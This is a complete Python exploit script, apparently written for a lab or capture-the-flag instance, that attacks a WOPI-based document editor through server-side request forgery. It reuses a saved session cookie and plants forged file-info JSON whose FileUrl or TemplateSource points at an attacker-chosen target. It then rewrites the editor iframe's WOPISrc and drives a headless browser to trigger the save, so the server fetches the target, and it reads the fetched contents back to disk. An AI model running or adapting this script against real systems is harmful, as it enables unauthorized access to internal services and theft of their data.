import html
import json
import os
import random
import re
import subprocess
import sys
import time
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import requests

BASE = "http://INSTANCE_URL"
COOKIE_FILE = os.path.join(os.path.dirname(__file__), "cookies2.txt")
DOC = "d9"
MODE = sys.argv[2] if len(sys.argv) > 2 else "fileurl"
OUT = os.path.join(os.path.dirname(__file__), "ssrf")
os.makedirs(OUT, exist_ok=True)


def load_cookie():
    with open(COOKIE_FILE, encoding="utf-8") as f:
        for line in f:
            if "docus_session" in line:
                return line.strip().split("\t")[-1]
    raise RuntimeError


COOKIE = load_cookie()


def session():
    s = requests.Session()
    s.cookies.set("docus_session", COOKIE, domain=urlparse(BASE).hostname)
    return s


def req(s, method, path, **kw):
    r = None
    for i in range(6):
        try:
            r = s.request(method, BASE + path, timeout=kw.pop("timeout", 25), **kw)
            if r.status_code == 429:
                time.sleep(2 + i * 2)
                continue
            return r
        except requests.RequestException:
            time.sleep(2 + i * 2)
    return r


def token(s):
    r = req(s, "GET", f"/edit/{DOC}")
    m = re.search(r'<iframe[^>]+src="([^"]+)"', r.text, re.I)
    if not m:
        raise RuntimeError(f"no iframe {r.status_code} {r.text[:100]}")
    return html.unescape(m.group(1))


def build_iframe(iframe, target_url):
    u = urlparse(iframe)
    q = parse_qs(u.query)
    q["WOPISrc"] = [target_url]
    return urlunparse((u.scheme, u.netloc, u.path, u.params, urlencode(q, doseq=True), u.fragment))


def main():
    target = sys.argv[1]
    stamp = str(int(time.time() * 1000)) + str(random.randint(100, 999))
    fake_src = f"http://webapp:8000/wopi/files/{DOC}/contents?ssrf={stamp}"
    body = {
        "BaseFileName": "x.txt",
        "Size": 0,
        "OwnerId": "solver83@corp",
        "UserId": "solver83@corp",
        "UserFriendlyName": "solver83",
        "UserCanWrite": True,
        "SupportsLocks": False,
        "IsAnonymousUser": False,
        "LastModifiedTime": "2026-10-31T19:00:00Z",
    }
    if MODE == "template":
        body["TemplateSource"] = target
        body["TemplateSaveAs"] = "x.txt"
    else:
        body["FileUrl"] = target
    data = json.dumps(body).encode()
    body["Size"] = len(data)
    data = json.dumps(body).encode()

    s = session()
    iframe = token(s)
    tok = parse_qs(urlparse(iframe).query).get("access_token", [""])[0]
    p = req(s, "POST", f"/wopi/files/{DOC}/contents", params={"access_token": tok}, data=data,
            headers={"X-WOPI-Override": "PUT", "Content-Type": "application/octet-stream"})
    print("put-cfi", p.status_code, p.text[:80])
    if p.status_code not in (200, 201):
        return
    url = build_iframe(iframe, fake_src)
    print("trigger", url[:160])
    js = ("async page => { await page.goto(%s, {waitUntil: 'domcontentloaded', timeout: 30000});"
          " await page.waitForTimeout(7000); await page.keyboard.press('Control+s');"
          " await page.waitForTimeout(8000); }") % json.dumps(BASE + url)
    with open(os.path.join(OUT, "trigger.js"), "w", encoding="utf-8") as f:
        f.write(js)
    r = subprocess.run(["playwright-cli.cmd", "run-code", "--filename=" + os.path.join(OUT, "trigger.js")],
                       capture_output=True, text=True, timeout=70)
    print("browser", r.returncode, (r.stdout or r.stderr)[:160].replace("\n", " "))
    try:
        iframe2 = token(s)
        q = parse_qs(urlparse(iframe2).query)
        tok2 = q.get("access_token", [""])[0]
        c = req(s, "GET", f"/wopi/files/{DOC}/contents", params={"access_token": tok2})
        fn = os.path.join(OUT, re.sub(r"[^A-Za-z0-9]+", "_", target)[:80] + "_" + stamp + ".bin")
        with open(fn, "wb") as f:
            f.write(c.content)
        print("result", c.status_code, len(c.content), fn)
        print("head", repr(c.content[:300]))
    except Exception as e:
        print("readback-err", e)


if __name__ == "__main__":
    main()
